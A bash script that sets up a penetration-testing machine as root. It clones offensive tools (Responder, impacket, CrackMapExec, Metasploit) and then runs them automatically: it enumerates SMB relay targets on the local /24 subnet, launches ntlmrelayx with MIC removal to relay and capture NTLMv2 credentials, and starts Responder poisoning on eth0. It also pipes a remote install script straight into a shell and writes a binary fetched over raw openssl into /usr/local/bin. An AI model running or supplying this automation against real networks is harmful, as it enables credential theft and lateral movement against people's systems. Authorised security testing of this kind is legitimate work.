#!/bin/bash
set -u 
set -e
# check OS
function check_OS() {
  grep -qis $@ /etc/os-release
}

check_OS Ubuntu || check_OS Debian || check_OS Kali || { echo "No supported OS found. Exit!!!" && exit 127; }

if [[ "$EUID" != 0  ]]
then
  echo "It must be run as root!!!"
  exit 1
fi
# check connection
echo "Q" | openssl s_client -connect infosec.xyz:443 || { echo "The proxy needed!!!" && exit 1; }

# Kali only
check_OS Kali && echo '' > /etc/apt/sources.list && echo 'deb http://kali.cs.nctu.edu.tw/kali kali-rolling main contrib non-free' >> /etc/apt/sources.list

packages=(python-pip ruby-dev vim git zsh curl wget tmux ruby ruby-bundler python-ldap autoconf build-essential libpcap-dev libpq-dev zlib1g-dev libsqlite3-dev python-setuptools python-dev)

# Download pacapt
echo -e 'GET /icy/pacapt/ng/pacapt HTTP/1.0\r\nHost: raw.githubusercontent.com\n\r' | openssl s_client -quiet -connect raw.githubusercontent.com:443 > /usr/local/bin/pacman
chmod +x /usr/local/bin/pacman
export DEBIAN_FRONTEND=noninteractive
pacman -Syu --assume-yes -o Dpkg::Options::="--force-confdef" -o Dpkg::Options::="--force-confold" 
pacman -S --noconfirm ${packages[@]} -o Dpkg::Options::="--force-confdef" -o Dpkg::Options::="--force-confold"

git clone https://github.com/icy/pacapt
cp pacapt/pacapt /usr/local/bin/pacman
chmod +x /usr/local/bin/pacman

# Setup tools
mkdir -p Tools && cd Tools
git clone https://github.com/lgandx/Responder
git clone https://github.com/SecureAuthCorp/impacket
git clone https://github.com/ropnop/windapsearch
git clone https://github.com/byt3bl33d3r/CrackMapExec
git clone https://github.com/rapid7/metasploit-framework

sed -e 's#SMB.*#SMB = Off#' -e 's#HTTP\ =.*#HTTP = Off#' Responder/Responder.conf

tmux new -d -s impacket 'cd impacket; python setup.py install --user; zsh'
tmux new -d -s CrackMapExec 'cd CrackMapExec; git submodule update --init --recursive; python setup.py install --user; zsh'
tmux new -d -s metasploit "cd metasploit-framework; export GEM_HOME=$(ruby -e 'print Gem.user_dir'); rm Gemfile.lock; bundle install; zsh"

# Run tools
tmux send-keys -t CrackMapExec "~/.local/bin/cme smb $(ip route get 1 | awk '{print $7}')/24 --gen-relay-list ~/targets.txt && tmux send-keys -t impacket '~/.local/bin/ntlmrelayx.py -tf ~/targets.txt -smb2support --remove-mic -of ~/ntlmv2_relay.txt'"
tmux new -d -s Responder 'cd ~/Tools/Responder; python Responder.py -I eth0 -rwdf'

# Install oh-my-zsh
sh -c "$(curl -fsSL https://raw.githubusercontent.com/robbyrussell/oh-my-zsh/master/tools/install.sh)"

echo "export GEM_HOME=$(ruby -e 'print Gem.user_dir')" >> ~/.oh-my-zsh/custom/origin-custom.zsh
echo 'export EDITOR=vim' >>  ~/.oh-my-zsh/custom/origin-custom.zsh

